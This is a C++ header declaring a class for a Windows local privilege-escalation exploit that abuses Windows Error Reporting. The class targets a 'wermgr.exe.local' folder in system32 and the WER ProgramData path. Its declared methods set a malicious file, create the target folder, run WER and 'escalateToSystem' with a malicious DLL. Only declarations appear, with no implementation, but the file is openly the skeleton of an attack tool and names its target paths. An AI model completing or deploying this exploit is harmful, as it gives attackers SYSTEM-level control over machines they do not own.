#pragma once
#include <string>
#include <vector>

class D_WER
{
public:
	D_WER(const std::wstring target_folder = L"c:\\windows\\system32\\wermgr.exe.local");

	const std::wstring get_target_folder(void);
	const bool set_target_folder(const std::wstring target_folder);

	const std::wstring get_malicious_file(void);
	const bool set_malicious_file(const std::wstring malicious_file);

	const bool create_target_folder(void);
	const bool escalateToSystem(std::wstring maliciousDLL);


private:
	const std::wstring WER_Path = L"C:\\ProgramData\\Microsoft\\Windows\\WER\\" ;

	std::wstring target_folder;
	std::wstring malicious_file;


	const bool execute_WER(void);
	std::wstring max_version_folder(std::vector<std::wstring> filenamesList);
	std::vector<std::wstring> searchFileFolder(LPCWSTR file_or_folder);

};

